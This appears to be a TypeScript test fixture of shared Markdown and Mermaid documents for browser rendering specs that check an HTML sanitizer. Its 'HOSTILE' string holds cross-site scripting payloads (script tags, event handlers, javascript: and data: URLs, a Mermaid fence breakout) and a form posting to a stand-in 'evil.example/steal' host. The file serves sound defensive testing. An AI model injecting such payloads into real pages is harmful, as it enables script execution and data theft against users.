// Shared Markdown/Mermaid probe documents for the real-Chromium rendering
// specs: document-safety.spec.ts and mermaid-diagram-types.spec.ts (the task
// workspace) and tui-preview.spec.ts (the rich draft preview) render the SAME
// documents, so both surfaces are held to one tested sanitizer/Mermaid matrix.

// Hostile Markdown/HTML: scripts, handlers, executable URLs, forms, frames,
// DOM clobbering, raw SVG/MathML and a Mermaid fence breakout, plus safe GFM
// that must survive.
export const HOSTILE = [
  "# Hostile document",
  "",
  '<script>window.__pwned = "script"</script>',
  "",
  '<img src="x" onerror="window.__pwned = \'onerror\'">',
  "",
  '<a id="js" href="javascript:window.__pwned=\'js-url\'">js link</a>',
  "",
  '<a id="data" href="data:text/html,<script>window.__pwned=1</script>">data link</a>',
  "",
  "<style>body { display: none !important; }</style>",
  "",
  '<form action="https://evil.example/steal"><input name="q" value="typed"><button>Send</button></form>',
  "",
  '<iframe src="https://evil.example/frame"></iframe>',
  "",
  '<div id="location">clobber attempt</div><img name="body">',
  "",
  '<svg onload="window.__pwned=\'svg\'"><script>window.__pwned="svg-script"</script></svg>',
  "",
  "<math><mi onclick=\"window.__pwned='math'\">x</mi></math>",
  "",
  "```mermaid",
  "graph LR",
  "  A-->B",
  '</pre><script>window.__pwned="fence-breakout"</script><pre>',
  "```",
  "",
  "Safe **emphasis**, a [relative link](/task/1), a [site](https://example.com) and <mailto@example.com>.",
  "",
  "| col | val |",
  "| --- | --- |",
  "| a   | 1   |",
  "",
  "- [x] done item",
  "- [ ] todo item",
  "",
  "Literal angle brackets in source: `<>&` and see @1 for the ref.",
  "",
  "```js",
  "console.log('<b>not html</b>')",
  "```",
].join("\n");

// Diagram-type matrix. Each entry seeds a fence in the rendered body and
// asserts a unique-to-this-diagram label round-trips into the SVG textContent.
//
// The labels (FlowProbeNode, StateProbeAlpha, etc.) are arbitrary but
// MUST be unique across the matrix so a regression that wires Block N's
// renderer to Block M's source still fails.
export interface DiagramCase {
  type: string; // human label only
  fence: string; // body between the ```mermaid fences
  probe: string; // label that must appear in the rendered SVG textContent
}

export const CASES: DiagramCase[] = [
  {
    type: "flowchart",
    fence: ["flowchart LR", '  A["FlowProbeNode"] --> B["FlowProbeEdge"]'].join("\n"),
    probe: "FlowProbeNode",
  },
  {
    type: "stateDiagram-v2",
    fence: ["stateDiagram-v2", "    [*] --> StateProbeAlpha", "    StateProbeAlpha --> [*]"].join("\n"),
    probe: "StateProbeAlpha",
  },
  {
    type: "sequenceDiagram",
    fence: ["sequenceDiagram", "    SeqProbeActor->>SeqProbeTarget: hi"].join("\n"),
    probe: "SeqProbeActor",
  },
  {
    type: "classDiagram",
    fence: ["classDiagram", "    class ClassProbeFoo { +bar() }"].join("\n"),
    probe: "ClassProbeFoo",
  },
  {
    type: "pie",
    fence: ["pie title PieProbeTitle", '  "PieProbeSlice" : 1'].join("\n"),
    probe: "PieProbeSlice",
  },
];

export function buildBody(): string {
  // Number the fences in the source so a failure message points to the
  // right block even if the markdown renderer reorders them (it doesn't,
  // but the comments serve as a sanity anchor in test output).
  const sections: string[] = ["# Mermaid diagram type matrix", ""];
  CASES.forEach((c, i) => {
    sections.push(`## Block ${i + 1} — ${c.type}`);
    sections.push("");
    sections.push("```mermaid");
    sections.push(c.fence);
    sections.push("```");
    sections.push("");
  });
  return sections.join("\n");
}
